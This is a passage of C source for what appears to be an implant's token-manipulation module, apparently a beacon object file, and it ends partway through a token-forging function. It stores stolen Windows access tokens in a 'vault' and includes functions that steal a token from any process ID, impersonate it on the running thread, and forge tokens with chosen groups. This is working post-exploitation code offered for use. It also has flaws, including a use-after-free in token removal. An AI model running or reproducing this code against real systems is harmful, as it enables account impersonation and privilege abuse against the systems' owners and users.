#include <Token.h>
#include "ntlm.c"

/*
 * todo:
 * 	fix issue of implant crashing after token create, token make_pth, token impersonate last make_pth (NtSetInformationThread crashes)
 * 	fix issue of not being able to call token create twice
 * 	do not use "token create", not stable at all
 */

/*!
 * @brief
 *	convert a privilege by name to LUID
 *
 * @param priv
 *	name of the privilege
 *
 * @return
 *	luid of the privilege
 */
LUID ConvertPrivilegeToLuid(
	PWSTR priv
) {
	LUID luid = { 0 };

	if ( StringCompareW( priv, "SECREATETOKENPRIVILEGE" ) ) luid.LowPart = 2;
	else if ( StringCompareW( priv, "SEASSIGNPRIMARYTOKENPRIVILEGE" ) ) luid.LowPart = 3;
	else if ( StringCompareW( priv, "SELOCKMEMORYPRIVILEGE" ) ) luid.LowPart = 4;
	else if ( StringCompareW( priv, "SEINCREASEQUOTAPRIVILEGE" ) ) luid.LowPart = 5;
	else if ( StringCompareW( priv, "SEMACHINEACCOUNTPRIVILEGE" ) ) luid.LowPart = 6;
	else if ( StringCompareW( priv, "SETCBPRIVILEGE" ) ) luid.LowPart = 7;
	else if ( StringCompareW( priv, "SESECURITYPRIVILEGE" ) ) luid.LowPart = 8;
	else if ( StringCompareW( priv, "SETAKEOWNERSHIPPRIVILEGE" ) ) luid.LowPart = 9;
	else if ( StringCompareW( priv, "SELOADDRIVERPRIVILEGE" ) ) luid.LowPart = 10;
	else if ( StringCompareW( priv, "SESYSTEMPROFILEPRIVILEGE" ) ) luid.LowPart = 11;
	else if ( StringCompareW( priv, "SESYSTEMTIMEPRIVILEGE" ) ) luid.LowPart = 12;
	else if ( StringCompareW( priv, "SEPROFSINGLEPROCESSPRIVILEGE" ) ) luid.LowPart = 13;
	else if ( StringCompareW( priv, "SEINCBASEPRIORITYPRIVILEGE" ) ) luid.LowPart = 14;
	else if ( StringCompareW( priv, "SECREATEPAGEFILEPRIVILEGE" ) ) luid.LowPart = 15;
	else if ( StringCompareW( priv, "SECREATEPERMANENTPRIVILEGE" ) ) luid.LowPart = 16;
	else if ( StringCompareW( priv, "SEBACKUPPRIVILEGE" ) ) luid.LowPart = 17;
	else if ( StringCompareW( priv, "SERESTOREPRIVILEGE" ) ) luid.LowPart = 18;
	else if ( StringCompareW( priv, "SESHUTDOWNPRIVILEGE" ) ) luid.LowPart = 19;
	else if ( StringCompareW( priv, "SEDEBUGPRIVILEGE" ) ) luid.LowPart = 20;
	else if ( StringCompareW( priv, "SEAUDITPRIVILEGE" ) ) luid.LowPart = 21;
	else if ( StringCompareW( priv, "SESYSTEMENVIRONMENTPRIVILEGE" ) ) luid.LowPart = 22;
	else if ( StringCompareW( priv, "SECHANGENOTIFYPRIVILEGE" ) ) luid.LowPart = 23;
	else if ( StringCompareW( priv, "SEREMOTESHUTDOWNPRIVILEGE" ) ) luid.LowPart = 24;
	else if ( StringCompareW( priv, "SEUNDOCKPRIVILEGE" ) ) luid.LowPart = 25;
	else if ( StringCompareW( priv, "SESYNCAGENTPRIVILEGE" ) ) luid.LowPart = 26;
	else if ( StringCompareW( priv, "SEENABLEDELEGATIONPRIVILEGE" ) ) luid.LowPart = 27;
	else if ( StringCompareW( priv, "SEMANAGEVOLUMEPRIVILEGE" ) ) luid.LowPart = 28;
	else if ( StringCompareW( priv, "SEIMPERSONATEPRIVILEGE" ) ) luid.LowPart = 29;
	else if ( StringCompareW( priv, "SECREATEGLOBALPRIVILEGE" ) ) luid.LowPart = 30;
	else if ( StringCompareW( priv, "SETRUSTEDCREDMANACCESSPRIVILEGE" ) ) luid.LowPart = 31;
	else if ( StringCompareW( priv, "SERELABELPRIVILEGE" ) ) luid.LowPart = 32;
	else if ( StringCompareW( priv, "SEINCWORKINGSETPRIVILEGE" ) ) luid.LowPart = 33;
	else if ( StringCompareW( priv, "SETIMEZONEPRIVILEGE" ) ) luid.LowPart = 34;
	else if ( StringCompareW( priv, "SECREATESYMBOLICLINKPRIVILEGE" ) ) luid.LowPart = 35;
	else if ( StringCompareW( priv, "SEDELEGATESESSIONUSERIMPERSONATEPRIVILEGE" ) ) luid.LowPart = 36;

	return luid;
}

/*!
 * @brief
 *	get a token from the vault by id
 * 
 * @param id
 *	id of the token
 *
 * @return
 *	ptr to the token structure
 */
PTOKEN_ENTRY TokenGet(
	USHORT id
) {
	PTOKEN_ENTRY tokenEntry = { 0 };
	PTOKEN_VAULT tokenVault = { 0 };

	//
	// get the token vault
	//
	tokenVault = BeaconGetValue( TOKEN_VAULT_KEY );

	if ( tokenVault && tokenVault->First ) {
		tokenEntry = tokenVault->First;

		//
		// search for the token with that id
		//
		do {
			if ( tokenEntry->Id == id ) {
				return tokenEntry;
			}
		} while ( ( tokenEntry = tokenEntry->Next ) );
	}

	return NULL;
}

/*!
 * @brief
 *	add a token to the vault
 *
 * @param token
 *	handle to the token
 *
 * @param pidStolen
 *	whether or not it was stolen
 *
 * @param username
 *	user of the token
 *
 * @param domain
 *	domain of the user
 *
 * @param password
 *	password of the user
 *
 * @return
 */
VOID TokenAdd(
	IN HANDLE         token,
	IN OPTIONAL ULONG pidStolen,
	IN OPTIONAL PWSTR username,
	IN OPTIONAL PWSTR domain,
	IN OPTIONAL PWSTR password
) {
	NTSTATUS                    status      = { 0 };
	ULONG                       userLen     = { 0 };
	ULONG                       domnLen     = { 0 };
	ULONG                       passwordLen = { 0 };
	ULONG                       userSz      = { 0 };
	ULONG                       elevation   = { 0 };
	ULONG                       size        = { 0 };
	ULONG                       tokenType   = { 0 };
	PTOKEN_USER                 userInfo    = { 0 };
	SID_NAME_USE                sidType     = { 0 };
	OBJECT_ATTRIBUTES           objAttr     = { 0 };
	SECURITY_QUALITY_OF_SERVICE sqos        = { 0 };
	PTOKEN_VAULT                tokenVault  = { 0 };
	PTOKEN_ENTRY                tokenEntry  = { 0 };

	//
	// get the token vault
	//
	if ( ! ( tokenVault = BeaconGetValue( TOKEN_VAULT_KEY ) ) ) {
		//
		// the token vault does not exist, create it
		//
		tokenVault = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, sizeof( TOKEN_VAULT ) );
		BeaconAddValue( TOKEN_VAULT_KEY, tokenVault );
	}

	if ( ! tokenVault->First ) {
		//
		// if the token vault is empty, set its first element
		//
		tokenVault->First = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, sizeof( TOKEN_ENTRY ) );
		tokenEntry        = tokenVault->First;
	} else {
		//
		// add to the token vault
		//
		tokenEntry = tokenVault->First;

		while ( tokenEntry->Next && ( tokenEntry = tokenEntry->Next ) );

		tokenEntry->Next = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, sizeof( TOKEN_ENTRY ) );
		tokenEntry       = tokenEntry->Next;
	}

	//
	// set the username and domain
	//
	if ( ! domain || ! username ) {
		//
		// query the user of the token
		//
		if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( token, TokenUser, userInfo, 0, &userSz ) ) ) {
			userInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, userSz );

			//
			// get the sid
			//
			if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken( token, TokenUser, userInfo,
				userSz, &userSz ) ) ) {
				PRINT_NT_ERROR( "NtQueryInformationToken", status );
				goto END;
			}

			//
			// convert the sid
			//
			if ( ! ADVAPI32$LookupAccountSidW( NULL, userInfo->User.Sid, NULL, &userLen, NULL, &domnLen, &sidType ) ) {
				//
				// allocate memory & recall
				//
				tokenEntry->Username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( userLen + 1 ) * 2 );
				tokenEntry->Domain   = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( domnLen + 1 ) * 2 );

				// convert the sid to a username and domain
				if ( ! ADVAPI32$LookupAccountSidW(
					NULL,
					userInfo->User.Sid,
					tokenEntry->Username,
					&userLen,
					tokenEntry->Domain,
					&domnLen,
					&sidType
				) ) {
					PRINT_WIN32_ERROR( "LookupAccountSidA" );
					goto END;
				}
			}
		}
	} else {
		// set the domain
		domnLen            = StringLenW( domain );
		tokenEntry->Domain = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( domnLen + 1 ) * 2 );
		MemCopy( tokenEntry->Domain, domain, domnLen * 2 );

		// set the username
		userLen              = StringLenW( username );
		tokenEntry->Username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( userLen + 1 ) * 2 );
		MemCopy( tokenEntry->Username, username, userLen * 2 );
	}

	//
	// set data
	//
	tokenEntry->PidStolen = pidStolen;
	tokenEntry->Id        = ++tokenVault->LastId;
	if ( password ) {
		passwordLen          = StringLenW( password );
		tokenEntry->Password = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( passwordLen + 1 ) * 2 );
		MemCopy( tokenEntry->Password, password, passwordLen * 2 );
	}

	//
	// get the elevation level
	//
	if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
		token,
		TokenElevation,
		&elevation,
		sizeof(elevation),
		&size
	) ) ) {
		PRINT_NT_ERROR( "NtQueryInformationToken", status );
		goto END;
	}

	tokenEntry->Elevated = elevation;

	//
	// duplicate the token to have both an impersonate and primary token
	// query what type is it first
	//
	if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
		token,
		TokenType,
		&tokenType,
		sizeof( tokenType ),
		&size
	) ) ) {
		PRINT_NT_ERROR( "NtQueryInformationToken", status );
		goto END;
	}

	if ( tokenType == 1 ) {
		//
		// it is a primay token
		//
		tokenEntry->PrimaryToken = token;
	} else {
		//
		// it is an impersonation token
		//
		tokenEntry->ImpersonationToken = token;
	}

	//
	// duplicate the token
	// if you dont specify the sqos it crashes when calling ntdll!NtSetInformationThread with that token
	// does not return an error, it crashes, love it :)
	//
	sqos.Length              = sizeof( SECURITY_QUALITY_OF_SERVICE );
	sqos.ImpersonationLevel  = SecurityImpersonation;
	sqos.ContextTrackingMode = 0;
	sqos.EffectiveOnly       = FALSE;

	InitializeObjectAttributes( &objAttr, NULL, 0, NULL, 0 );
	objAttr.SecurityQualityOfService = &sqos;

	if ( ! NT_SUCCESS( status = NTDLL$NtDuplicateToken(
		token,
		TOKEN_ALL_ACCESS,
		&objAttr,
		FALSE,
		( tokenType == 1 ) ? TokenImpersonation : TokenPrimary,
		( tokenType == 1 ) ? &tokenEntry->ImpersonationToken : &tokenEntry->PrimaryToken
	) ) ) {
		PRINT_NT_ERROR( "NtDuplicateToken", status );
		goto END;
	}

END:
	if ( userInfo ) NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, userInfo );

	if ( ! NT_SUCCESS( status ) ) {
		PRINTF_ERROR( "Failed to add the token to the vault\n" );
	} else {
		PRINTF( "Successfully added the token to the vault\n" );
	}
}

/*!
 * @brief
 *	list the tokens of the vault
 */
VOID TokenList() {
	PTOKEN_VAULT tokenVault = BeaconGetValue( TOKEN_VAULT_KEY );
	PTOKEN_ENTRY tokenEntry = { 0 };

	if ( tokenVault && tokenVault->First ) {
		tokenEntry = tokenVault->First;

		//
		// iterate through all tokens
		//
		do {
			PRINTF(
				"\n"
				"Id        : %u\n"
				"Elevated  : %s\n"
				"Process Id: %ld\n"
				"User      : %ls\\%ls\n"
				"\n",
				tokenEntry->Id,
				( tokenEntry->Elevated ) ? "True" : "False",
				tokenEntry->PidStolen,
				tokenEntry->Domain,
				tokenEntry->Username
			);
		} while ( ( tokenEntry = tokenEntry->Next ) );
	} else {
		PRINTF( "The token vault is empty!" );
	}
}

/*!
 * @brief
 *	revert to the original token
 */
VOID TokenRevert() {
	NTSTATUS     Status     = { 0 };
	HANDLE       Token      = { 0 };
	PTOKEN_VAULT TokenVault = { 0 };

	// get the token vault
	TokenVault = BeaconGetValue( TOKEN_VAULT_KEY );

	if ( TokenVault ) {
		// clear the current token
		TokenVault->Current = NULL;

		// stop impersonating that token in the current thread
		if ( ! NT_SUCCESS( Status = NTDLL$NtSetInformationThread(
			NtCurrentThread(),
			ThreadImpersonationToken,
			&Token,
			sizeof( HANDLE )
		) ) ) {
			PRINT_NT_ERROR( "NtSetInformationThread", Status );
		}

		PRINTF( "Successfully reverted to orignal token!" );
	} else {
		PRINTF( "The token vault is empty, can't revert!" );
	}
}

/*!
 * @brief
 *	remove a token from the vault
 *
 * @param id
 *	id of the token to remove
 */
VOID TokenRemove(
	USHORT id
) {
	PTOKEN_VAULT tokenVault    = BeaconGetValue( TOKEN_VAULT_KEY );
	PTOKEN_ENTRY tokenEntry    = { 0 };
	PTOKEN_ENTRY previousEntry = { 0 };

	if ( tokenVault && tokenVault->First ) {
		tokenEntry = tokenVault->First;

		//
		// iterate through all tokens
		//
		do {
			if ( tokenEntry->Id == id ) {
				//
				// revert if this is the current token
				//
				if ( tokenEntry == tokenVault->Current ) {
					TokenRevert();
				}

				//
				// unlink the element
				//
				if ( previousEntry ) {
					previousEntry->Next = tokenEntry->Next;
				} else {
					tokenVault->First = tokenEntry->Next;
				}

				//
				// free the element
				//
				if ( tokenEntry->Domain )
					NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, tokenEntry->Domain );
				if ( tokenEntry->Password )
					NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, tokenEntry->Password );
				if ( tokenEntry->Username )
					NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, tokenEntry->Username );

				NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, tokenEntry );

				//
				// close the tokens
				//
				NTDLL$NtClose( tokenEntry->ImpersonationToken );
				NTDLL$NtClose( tokenEntry->PrimaryToken );

				PRINTF( "Successfully removed token from vault!" );
				return;
			}

			previousEntry = tokenEntry;
		} while ( ( tokenEntry = tokenEntry->Next ) );
	} else {
		PRINTF( "The token vault is empty!" );
	}
}

/*!
 * @brief
 *	print the user of the current token
 */
VOID TokenGetuid() {
	NTSTATUS     status    = { 0 };
	PTOKEN_USER  userInfo  = { 0 };
	ULONG        userSize  = { 0 };
	PTOKEN_VAULT vault     = BeaconGetValue( TOKEN_VAULT_KEY );
	PSTR         username  = { 0 };
	ULONG        userLen   = { 0 };
	ULONG        domainLen = { 0 };
	SID_NAME_USE SidType   = { 0 };


	if ( vault && vault->Current ) {
		PRINTF( "%ls\\%ls", vault->Current->Domain, vault->Current->Username );
	} else {
		PRINTF( "bitch" );
		if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken(
			NtCurrentThreadEffectiveToken(),
			TokenUser,
			userInfo,
			0,
			&userSize
		) ) ) {
			userInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, userSize );

			// get the sid
			if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
				NtCurrentThreadEffectiveToken(),
				TokenUser,
				userInfo,
				userSize,
				&userSize
			) ) ) {
				PRINT_NT_ERROR( "NtQueryInformationToken", status );
				return;
			}

			// convert the sid
			if ( ! ADVAPI32$LookupAccountSidA( NULL, userInfo->User.Sid, NULL, &userLen, NULL, &domainLen,
			                                   &SidType ) ) {
				//
				// allocate memory & recall
				//
				username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, userLen + domainLen );

				if ( ! ADVAPI32$LookupAccountSidA( NULL, userInfo->User.Sid, username + domainLen, &userLen,
				                                   username, &domainLen, &SidType
				) ) {
					PRINT_WIN32_ERROR( "LookupAccountSidA" );
					goto END;
				}

				username[ domainLen ] = '\\';
			}

			PRINTF( "%s", username );
		}
	}

END:
	if ( username ) NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, username );
}

/*!
 * @brief
 * 	query token information using NtQueryInformationToken
 *
 * @param Token
 * 	token to query the information of
 *
 * @return
 * 	ntstatus
 */
VOID TokenInfo(
	IN HANDLE Token
) {
	NTSTATUS                     status      = { 0 };
	PTOKEN_USER                  userInfo    = { 0 };
	ULONG                        size        = { 0 };
	PCHAR                        username    = { 0 };
	DWORD                        userLen     = { 0 };
	DWORD                        grpLen      = { 0 };
	DWORD                        domnLen     = { 0 };
	SID_NAME_USE                 sidType     = { 0 };
	PTOKEN_GROUPS_AND_PRIVILEGES grpAndPrivs = { 0 };
	PSID_AND_ATTRIBUTES          grp         = { 0 };
	PWSTR                        grpName     = { 0 };
	PWSTR                        domn        = { 0 };
	UNICODE_STRING               sidSddl     = { 0 };
	PTOKEN_ACCESS_INFORMATION    accessInfo  = { 0 };
	ULONG                        elevation   = { 0 };
	ULONG                        type        = { 0 };

	// query the user of the token
	if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( Token, TokenUser, userInfo, 0, &size ) ) ) {
		userInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size );

		// get the sid
		if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
			Token,
			TokenUser,
			userInfo,
			size,
			&size
		) ) ) {
			PRINT_NT_ERROR( "NtQueryInformationToken", status );
			goto END;
		}

		//
		// convert the sid
		//
		if ( ! ADVAPI32$LookupAccountSidA(
			NULL,
			userInfo->User.Sid,
			NULL,
			&userLen,
			NULL,
			&domnLen,
			&sidType
		) ) {
			//
			// allocate memory & recall
			//
			username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, userLen + domnLen );

			if ( ! ADVAPI32$LookupAccountSidA( NULL, userInfo->User.Sid, username + domnLen, &userLen,
			                                   username, &domnLen, &sidType
			) ) {
				PRINT_WIN32_ERROR( "LookupAccountSidA" );
				goto END;
			}

			username[ domnLen ] = '\\';
		}

		//
		// get the sid as SDDL
		//
		if ( ! NT_SUCCESS( status = NTDLL$RtlConvertSidToUnicodeString( &sidSddl, userInfo->User.Sid, TRUE ) ) ) {
			NTDLL$RtlFreeUnicodeString( &sidSddl );
			PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", status );
			goto END;
		}

		PRINTF( "%s - %ls\n", username, sidSddl.Buffer );

		NTDLL$RtlFreeUnicodeString( &sidSddl );
	}

	//
	// query group and privileges
	//
	if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken(
		Token,
		TokenGroupsAndPrivileges,
		grpAndPrivs,
		0,
		&size
	) ) ) {
		//
		// allocate memory & recall
		//
		grpAndPrivs = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size );

		if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
			Token,
			TokenGroupsAndPrivileges,
			grpAndPrivs,
			size,
			&size
		) ) ) {
			PRINT_NT_ERROR( "NtQueryInformationToken", status );
			goto END;
		}

		//
		// iterate through all groups
		//
		for ( int SidCnt = 0 ; SidCnt < grpAndPrivs->SidCount ; SidCnt++ ) {
			grp     = &grpAndPrivs->Sids[ SidCnt ];
			grpLen  = 0;
			domnLen = 0;

			//
			// get the sid as SDDL
			//
			if ( ! NT_SUCCESS( status = NTDLL$RtlConvertSidToUnicodeString( & sidSddl, grp->Sid, TRUE ) ) ) {
				PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", status );
				goto END;
			}

			//
			// resolve the sid
			//
			if ( ! ADVAPI32$LookupAccountSidW( NULL, grp->Sid, NULL, &grpLen, NULL, &domnLen, &sidType ) ) {
				grpName = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( grpLen + 1 ) * sizeof( WCHAR ) );
				domn    = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( domnLen + 1 ) * sizeof( WCHAR ) );

				if ( ! ADVAPI32$LookupAccountSidW( NULL, grp->Sid, grpName, &grpLen, domn, &domnLen, &sidType ) ) {
					PRINT_WIN32_ERROR( "LookupAccountSidW" );
					goto END;
				}
			}

			PRINTF( "Group: %ls - %ls\\%ls\n", sidSddl.Buffer, domn, grpName );
			NTDLL$RtlFreeUnicodeString( &sidSddl );
			NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, grpName );
			NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, domn );
		}

		//
		// iterate through all privileges
		//
		for ( int i = 0 ; i < grpAndPrivs->PrivilegeCount ; i++ ) {
			PRINTF( "Priv: %u", grpAndPrivs->Privileges[i].Luid.LowPart );
		}
	}

	//
	// query elevation
	//
	if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
		Token,
		TokenElevation,
		&elevation,
		sizeof(elevation),
		&size
	) ) ) {
		PRINT_NT_ERROR( "NtQueryInformationToken", status );
		goto END;
	}

	PRINTF( "Elevated : %s\n", (elevation == 0) ? "False" : "True" );

	//
	// query type
	//
	if ( ! NT_SUCCESS(
		status = NTDLL$NtQueryInformationToken( Token, TokenType, &type, sizeof( type ), &size ) ) ) {
		PRINT_NT_ERROR( "NtQueryInformationToken", status );
		goto END;
	}

	PRINTF( "Type: %s\n", (type == 1) ? "Primary" : "Impersonation" );

	//
	// query impersonation level
	//
	if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( Token, TokenAccessInformation, NULL, 0, &size ) ) ) {
		accessInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size );
		NTDLL$NtQueryInformationToken( Token, TokenAccessInformation, accessInfo, size, &size );

		switch ( accessInfo->ImpersonationLevel ) {
			case 0 :
				PRINTF( "Impersonation level: anonymous\n" );
				break;
			case 1 :
				PRINTF( "Impersonation level: identification\n" );
				break;
			case 2 :
				PRINTF( "Impersonation level: impersonation\n" );
				break;
			case 3 :
				PRINTF( "Impersonation level: delegation\n" );
				break;
			default :
				PRINTF( "Impersonation level: unknown\n" );
		}
	}

END:
	if ( userInfo ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, userInfo );
	if ( username ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, username );
	if ( grpAndPrivs ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, grpAndPrivs );
	if ( accessInfo ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, accessInfo );
}

/*!
 * @brief
 * 	steal the token of a process with the DUPLICATE access mask
 *
 * @param pid
 * 	pid of the process to steal the token
 *
 * @return
 * 	token of the process
 */
VOID TokenSteal(
	IN ULONG pid
) {
	NTSTATUS          status   = { 0 };
	HANDLE            proc     = { 0 };
	HANDLE            token    = { 0 };
	OBJECT_ATTRIBUTES objAttrs = { 0 };
	CLIENT_ID         clientId = { 0 };

	clientId.UniqueProcess = pid;

	//
	// get a handle onto the process
	//
	if ( ! NT_SUCCESS(
		status = NTDLL$NtOpenProcess( &proc, PROCESS_QUERY_LIMITED_INFORMATION, &objAttrs, &clientId ) ) ) {
		PRINT_NT_ERROR( "NtOpenProcess", status );
		goto END;
	}

	//
	// query the token of that process
	//
	if ( ! NT_SUCCESS( status = NTDLL$NtOpenProcessTokenEx( proc, TOKEN_DUPLICATE | TOKEN_QUERY, 0, &token ) ) ) {
		PRINT_NT_ERROR( "NtOpenProcessTokenEx", status );
		goto END;
	}

	//
	// store the token
	//
	TokenAdd( token, pid, NULL, NULL, NULL );

END:
	NTDLL$NtClose( proc );
}

/*!
 * @brief
 *	impersonate a token
 *
 * @param id
 *	id of the token to impersonate
 */
VOID TokenImpersonate(
	IN USHORT id
) {
	NTSTATUS     status     = { 0 };
	PTOKEN_ENTRY tokenEntry = { 0 };
	PTOKEN_VAULT tokenVault = { 0 };

	// get the token vault
	tokenVault = BeaconGetValue( TOKEN_VAULT_KEY );

	if ( tokenVault && tokenVault->First ) {
		tokenEntry = tokenVault->First;

		// search for the token with that id
		do {
			if ( tokenEntry->Id == id ) {
				// set this token as the current one
				tokenVault->Current = tokenEntry;

				// impersonate the token
				if ( ! NT_SUCCESS( status = NTDLL$NtSetInformationThread(
					NtCurrentThread(),
					ThreadImpersonationToken,
					&tokenEntry->ImpersonationToken,
					sizeof( HANDLE )
				) ) ) {
					PRINT_NT_ERROR( "NtSetInformationThread", status );
					return;
				}

				PRINTF( "Successfully impersonated token with id %u", id );

				return;
			}
		} while ( ( tokenEntry = tokenEntry->Next ) );

		PRINTF_ERROR( "Failed to find a token with id %u", id );
	} else {
		PRINTF( "Can't impersonate token with id %u, the token vault is empty!", id );
	}
}

/*!
 * TODO: use secur32!LsaEnumerateLogonSessions to a find logon session corresponding to the user for cached creds
 * TODO: really not stable and privs & groups do not really seem to work, fix it
 *
 * @param username
 *	the username of the token
 *
 * @param groupNames
 *	the groups of the token
 *
 * @param groupLen
*	the number of groups for the token
*
 * @param privNames
 *	the privileges of the token
 *
 * @param privLen
 *	the number of privileges for the token
 */
VOID TokenCreate(
	IN PWSTR  username,
	IN PWSTR *groupNames,
	IN USHORT groupLen,
	IN PWSTR *privNames,
	IN USHORT privLen
) {
	BOOL                        success    = { 0 };
	NTSTATUS                    status     = { 0 };
	HANDLE                      token      = { 0 };
	PSID                        groupSid   = { 0 };
	PSID                        authSid    = { 0 };
	ULONG                       userSz     = { 0 };
	ULONG                       groupSz    = { 0 };
	ULONG                       domnSz     = { 0 };
	PTOKEN_GROUPS               groups     = { 0 };
	PWSTR                       domn       = { 0 };
	PTOKEN_PRIVILEGES           privs      = { 0 };
	TOKEN_PRIMARY_GROUP         primaryGrp = { 0 };
	TOKEN_USER                  user       = { 0 };
	OBJECT_ATTRIBUTES           objAttrs   = { 0 };
	SECURITY_QUALITY_OF_SERVICE sqos       = { 0 };
	LARGE_INTEGER               expire     = { 0 };
	SID_NAME_USE                sidType    = { 0 };
	SID_IDENTIFIER_AUTHORITY    authority  = SECURITY_MANDATORY_LABEL_AUTHORITY;
	LUID                        authLuid   = { .HighPart = 0, .LowPart = 999 };
	TOKEN_SOURCE                source     = { .SourceName = "Ch11", .SourceIdentifier = 777 };

	SID_GROUP_ENTRY groupsEntries[ NUMBER_OF_DEFAULT_GROUPS - 1 ] = {
		//{ .SidType = WinBuiltinAdministratorsSid, .GrpAttrs = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED | SE_GROUP_OWNER },
		{ .SidType = WinWorldSid, .GrpAttrs = SE_GROUP_ENABLED | SE_GROUP_DEFAULTED | SE_GROUP_OWNER },
		{ .SidType = WinInteractiveSid, .GrpAttrs = SE_GROUP_ENABLED | SE_GROUP_DEFAULTED },
		{ .SidType = WinLocalSystemSid, .GrpAttrs = SE_GROUP_ENABLED | SE_GROUP_DEFAULTED },
		{ .SidType = WinAuthenticatedUserSid, .GrpAttrs = SE_GROUP_ENABLED | SE_GROUP_DEFAULTED }
	};

	//
	// convert the username to a SID
	//
	if ( ! ADVAPI32$LookupAccountNameW( NULL, username, NULL, &userSz, NULL, &domnSz, &sidType ) ) {
		//
		// alloc memory
		//
		user.User.Sid = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, userSz );
		domn          = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( domnSz + 1 ) * 2 );

		//
		// call and free memory
		//
		success = ADVAPI32$LookupAccountNameW( NULL, username, user.User.Sid, &userSz, domn, &domnSz, &sidType );
		NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, domn );
		if ( ! success ) {
			PRINT_WIN32_ERROR( "LookupAccountNameW" );
			goto END;
		}
	}

	//
	// allocate memory for the groups
	//
	groups = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY,
	                                SIZE_OF_GROUPS( NUMBER_OF_DEFAULT_GROUPS + groupLen ) );
	groups->GroupCount = NUMBER_OF_DEFAULT_GROUPS + groupLen;

	//
	// loop through all default groups
	//
	for ( int i = 0 ; i < NUMBER_OF_DEFAULT_GROUPS - 1 ; i++ ) {
		//
		// reset the size
		//
		groupSz = 0;

		//
		// create a new sid
		//
		if ( ! ADVAPI32$CreateWellKnownSid( groupsEntries[ i ].SidType, NULL, NULL, &groupSz ) ) {
			//
			// alloc memory & re-call
			//
			groupSid = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, groupSz );

			if ( ! ADVAPI32$CreateWellKnownSid( groupsEntries[ i ].SidType, NULL, groupSid, &groupSz ) ) {
				PRINT_WIN32_ERROR( "CreateWellKnownSid" );
				goto END;
			}
		}

		//
		// add it to the list of groups
		//
		groups->Groups[ i ].Sid        = groupSid;
		groups->Groups[ i ].Attributes = groupsEntries[ i ].GrpAttrs;
	}

	//
	// set the primary group
	//
	primaryGrp.PrimaryGroup = groupSid;

	//
	// add the sid authority group
	// todo: there is a memleak related to this one, fix it
	//
	NTDLL$RtlAllocateAndInitializeSid( &authority, 1, SECURITY_MANDATORY_MEDIUM_RID, 0, 0, 0, 0, 0, 0, 0, &authSid );
	groups->Groups[ NUMBER_OF_DEFAULT_GROUPS - 1 ].Sid        = authSid;
	groups->Groups[ NUMBER_OF_DEFAULT_GROUPS - 1 ].Attributes = SE_GROUP_INTEGRITY | SE_GROUP_INTEGRITY_ENABLED;

	//
	// loop through all groups defined by the user
	//
	for ( int i = 0 ; i < groupLen ; i++ ) {
		//
		// convert the username to a SID
		//
		if ( ! ADVAPI32$LookupAccountNameW( NULL, groupNames[ i ], NULL, &userSz, NULL, &domnSz, &sidType ) ) {
			//
			// allocate memory, change attributes
			//
			groups->Groups[ NUMBER_OF_DEFAULT_GROUPS + i ].Sid = NTDLL$RtlAllocateHeap(
				NtCurrentHeap(), HEAP_ZERO_MEMORY, userSz );
			groups->Groups[ NUMBER_OF_DEFAULT_GROUPS + i ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED;
